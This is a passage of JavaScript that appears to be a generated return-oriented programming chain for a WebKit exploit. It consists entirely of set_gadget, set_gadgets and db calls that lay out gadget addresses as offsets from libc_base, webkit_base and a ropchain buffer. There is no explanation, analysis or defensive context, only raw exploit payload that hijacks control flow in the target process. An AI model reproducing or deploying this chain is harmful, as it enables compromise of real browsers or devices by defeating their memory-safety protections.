db([34, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+124752, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+124768, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+124856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+124912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+124984, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+125040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+125192, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+125280, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+125296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+125440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+125408, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+125424, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+125512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+125568, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+125648, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([35, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+125752, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+125768, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+125856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+125912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+125984, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+126040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+126144, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+126232, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+126248, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+126392, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+126360, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+126376, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+126488, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+126576, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+126592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+126736, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+126704, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+126720, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+126808, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+126864, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+126944, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([36, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+127048, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+127064, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+127152, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+127208, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+127280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+127336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+882884, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+127488, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+127576, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+127592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+127736, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+127704, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+127720, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+127808, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+127864, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+127944, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([37, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+128048, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+128064, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+128152, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+128208, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+128280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+128336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+785097, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+128488, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+128576, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+128592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+128736, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+128704, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+128720, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+128808, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+128864, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+128944, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([38, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+129048, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+129064, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+129152, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+129208, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+129280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+129336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+129464, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+129448, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+129560, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+129576, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+129688, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+129672, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+129760, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+129864, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+129848, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+129992, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+129976, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+130088, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+130176, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+130192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+130328, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+130344, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+130312, 
webkit_base+7438103, 
libc_base+793877 
]);
db([12, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+130432, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+130448, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+130600, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+130632, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+130584, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+130616, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+130744, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+130728, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967295, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+130848, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+130936, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+130952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+131056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+131040, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+131128, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877 
]);
db([12, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+131288, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+131304, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+131272, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+131424, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+131440, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+131408, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+8824269, 
libc_base+269973, 
libc_base+793877, 
ropchain+131608, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+131624, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+131592, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+131728, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+131792, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+131760, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+389047, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+131912, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+131904, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+131928, 
ropchain+136048, 
libc_base+793877, 
ropchain+131984, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+132072, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+132088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+132224, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+132240, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+132208, 
webkit_base+7438103, 
libc_base+793877 
]);
db([36, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+132328, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+132344, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+132496, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+132528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+132480, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+132512, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+132600, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+132616, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+132712, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+132696, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+132808, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+132896, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+132912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+133048, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+133064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+133032, 
webkit_base+7438103, 
libc_base+793877 
]);
db([12, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+133152, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+133168, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+133320, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+133352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+133304, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+133336, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+133424, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+133440, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+133560, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+133576, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+133544, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+8824269, 
libc_base+269973, 
libc_base+793877, 
ropchain+133744, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+133760, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+133728, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+133864, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+133928, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+133896, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+134040, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+134032, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+134056, 
ropchain+135688, 
libc_base+793877, 
ropchain+134112, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+134200, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+134216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+134368, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+134400, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+134352, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+134384, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+134472, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+134488, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+134648, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+134616, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+134600, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
